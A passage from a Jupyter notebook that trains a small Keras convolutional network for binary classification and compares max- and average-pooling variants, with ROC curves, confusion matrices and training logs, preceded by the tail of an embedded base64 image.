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)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tensorflow as tf\n",
    "from tensorflow import keras\n",
    "import itertools\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Define the input shape for the matrices\n",
    "input_shape = (150, 100, 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create the model\n",
    "model = keras.Sequential([\n",
    "    keras.layers.Conv2D(32, (2,2),padding=\"same\", activation='relu', input_shape=input_shape),\n",
    "    keras.layers.MaxPooling2D(pool_size=(2, 2)),\n",
    "    keras.layers.Conv2D(64, (2,2),padding=\"same\", activation='relu'),\n",
    "    keras.layers.MaxPooling2D(pool_size=(2, 2)),\n",
    "    keras.layers.Flatten(),\n",
    "    keras.layers.Dense(128, activation='relu'),\n",
    "    keras.layers.Dense(1, activation='sigmoid')\n",
    "])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Compile the model\n",
    "model.compile(optimizer='adam', loss='binary_crossentropy', metrics=['accuracy'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Train the model\n",
    "history = model.fit(X_train, y_train, epochs=5)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[[3164   34]\n",
      " [  56 1868]]\n",
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.98      0.99      0.99      3198\n",
      "           1       0.98      0.97      0.98      1924\n",
      "\n",
      "    accuracy                           0.98      5122\n",
      "   macro avg       0.98      0.98      0.98      5122\n",
      "weighted avg       0.98      0.98      0.98      5122\n",
      "\n"
     ]
    }
   ],
   "source": [
    "from keras.activations import softmax\n",
    "from sklearn.metrics import roc_curve, auc, confusion_matrix, f1_score, precision_score, recall_score, classification_report\n",
    "\n",
    "# Get the predicted probabilities for the test data\n",
    "y_pred = model.predict(X_test)\n",
    "\n",
    "y_pred_binary = np.round(y_pred)\n",
    "\n",
    "# Compute the ROC curve\n",
    "fpr, tpr, thresholds = roc_curve(y_test, y_pred)\n",
    "roc_auc = auc(fpr, tpr)\n",
    "\n",
    "# Plot the ROC curve\n",
    "plt.plot(fpr, tpr, label='ROC curve (AUC = %0.2f)' % roc_auc)\n",
    "plt.plot([0, 1], [0, 1], 'k--')  # random predictions curve\n",
    "plt.xlim([0.0, 1.0])\n",
    "plt.ylim([0.0, 1.0])\n",
    "plt.xlabel('False Positive Rate or (1 - Specifity)')\n",
    "plt.ylabel('True Positive Rate or (Sensitivity)')\n",
    "plt.title('Receiver Operating Characteristic')\n",
    "plt.legend(loc=\"lower right\")\n",
    "plt.show()\n",
    "\n",
    "print(confusion_matrix(y_test, y_pred_binary))\n",
    "print(classification_report(y_test, y_pred_binary))\n",
    "\n",
    "for i in ['accuracy', 'loss']:\n",
    "    acc = history.history[i]\n",
    "    epochs = range(1, len(acc) + 1)\n",
    "\n",
    "    plt.figure()\n",
    "    plt.plot(epochs, acc, label='Training {}'.format(i))\n",
    "    plt.title('Results for {}'.format(i))\n",
    "    plt.legend()\n",
    "    plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "----------------------\n",
      "Poolings: (<class 'keras.layers.pooling.MaxPooling2D'>, <class 'keras.layers.pooling.MaxPooling2D'>)\n",
      "----------------------\n",
      "Epoch 1/5\n",
      "641/641 [==============================] - 137s 212ms/step - loss: 0.1923 - accuracy: 0.9219\n",
      "Epoch 2/5\n",
      "641/641 [==============================] - 123s 192ms/step - loss: 0.0421 - accuracy: 0.9860\n",
      "Epoch 3/5\n",
      "641/641 [==============================] - 124s 194ms/step - loss: 0.0198 - accuracy: 0.9930\n",
      "Epoch 4/5\n",
      "641/641 [==============================] - 125s 195ms/step - loss: 0.0125 - accuracy: 0.9959\n",
      "Epoch 5/5\n",
      "641/641 [==============================] - 125s 196ms/step - loss: 0.0058 - accuracy: 0.9985\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[[3153   47]\n",
      " [  34 1888]]\n",
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.99      0.99      0.99      3200\n",
      "           1       0.98      0.98      0.98      1922\n",
      "\n",
      "    accuracy                           0.98      5122\n",
      "   macro avg       0.98      0.98      0.98      5122\n",
      "weighted avg       0.98      0.98      0.98      5122\n",
      "\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "----------------------\n",
      "Poolings: (<class 'keras.layers.pooling.MaxPooling2D'>, <class 'keras.layers.pooling.AveragePooling2D'>)\n",
      "----------------------\n",
      "Epoch 1/5\n",
      "641/641 [==============================] - 111s 172ms/step - loss: 0.2095 - accuracy: 0.9119\n",
      "Epoch 2/5\n",
      "641/641 [==============================] - 106s 166ms/step - loss: 0.0559 - accuracy: 0.9808\n",
      "Epoch 3/5\n",
      "641/641 [==============================] - 105s 163ms/step - loss: 0.0300 - accuracy: 0.9905\n",
      "Epoch 4/5\n",
      "641/641 [==============================] - 104s 162ms/step - loss: 0.0191 - accuracy: 0.9944\n",
      "Epoch 5/5\n",
      "641/641 [==============================] - 104s 162ms/step - loss: 0.0156 - accuracy: 0.9959\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[[3142   58]\n",
      " [  24 1898]]\n",
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.99      0.98      0.99      3200\n",
      "           1       0.97      0.99      0.98      1922\n",
      "\n",
      "    accuracy                           0.98      5122\n",
      "   macro avg       0.98      0.98      0.98      5122\n",
      "weighted avg       0.98      0.98      0.98      5122\n",
      "\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "----------------------\n",
      "Poolings: (<class 'keras.layers.pooling.AveragePooling2D'>, <class 'keras.layers.pooling.MaxPooling2D'>)\n",
      "----------------------\n",
      "Epoch 1/5\n",
      "641/641 [==============================] - 103s 161ms/step - loss: 0.2017 - accuracy: 0.9145\n",
      "Epoch 2/5\n",
      "641/641 [==============================] - 104s 162ms/step - loss: 0.0474 - accuracy: 0.9842\n",
      "Epoch 3/5\n",
      "641/641 [==============================] - 101s 158ms/step - loss: 0.0213 - accuracy: 0.9942\n",
      "Epoch 4/5\n",
      "641/641 [==============================] - 102s 159ms/step - loss: 0.0102 - accuracy: 0.9972\n",
      "Epoch 5/5\n",
      "641/641 [==============================] - 106s 165ms/step - loss: 0.0098 - accuracy: 0.9973\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[[3169   31]\n",
      " [  47 1875]]\n",
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.99      0.99      0.99      3200\n",
      "           1       0.98      0.98      0.98      1922\n",
      "\n",
      "    accuracy                           0.98      5122\n",
      "   macro avg       0.98      0.98      0.98      5122\n",
      "weighted avg       0.98      0.98      0.98      5122\n",
      "\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "----------------------\n",
      "Poolings: (<class 'keras.layers.pooling.AveragePooling2D'>, <class 'keras.layers.pooling.AveragePooling2D'>)\n",
      "----------------------\n",
      "Epoch 1/5\n",
      "641/641 [==============================] - 103s 157ms/step - loss: 0.2578 - accuracy: 0.8934\n",
      "Epoch 2/5\n",
      "641/641 [==============================] - 102s 159ms/step - loss: 0.0663 - accuracy: 0.9768\n",
      "Epoch 3/5\n",
      "641/641 [==============================] - 102s 159ms/step - loss: 0.0341 - accuracy: 0.9887\n",
      "Epoch 4/5\n",
      "641/641 [==============================] - 103s 161ms/step - loss: 0.0205 - accuracy: 0.9938\n",
      "Epoch 5/5\n",
      "641/641 [==============================] - 100s 156ms/step - loss: 0.0156 - accuracy: 0.9959\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[[3166   34]\n",
      " [  49 1873]]\n",
      "              precision    recall  f1-score   support\n",
      "\n",
      "           0       0.98      0.99      0.99      3200\n",
      "           1       0.98      0.97      0.98      1922\n",
      "\n",
      "    accuracy                           0.98      5122\n",
      "   macro avg       0.98      0.98      0.98      5122\n",
      "weighted avg       0.98      0.98      0.98      5122\n",
      "\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "from itertools import product\n",
    "import keras\n",
    "\n",
    "# Define the input shape for the matrices\n",
    "input_shape = (150, 100, 1)\n",
    "\n",
    "# Define the possible pooling layers\n",
    "pooling_layers = [keras.layers.MaxPooling2D, keras.layers.AveragePooling2D]\n",
    "\n",
    "# Get all possible combinations of pooling layers\n",
    "pooling_combinations = list(product(pooling_layers, repeat=2))\n",
    "\n",
    "for pooling_combo in pooling_combinations:\n",
    "    # Define the model\n",
    "    model = keras.Sequential([\n",
    "        keras.layers.Conv2D(32, (2,2),padding=\"same\", activation='relu', input_shape=input_shape),\n",
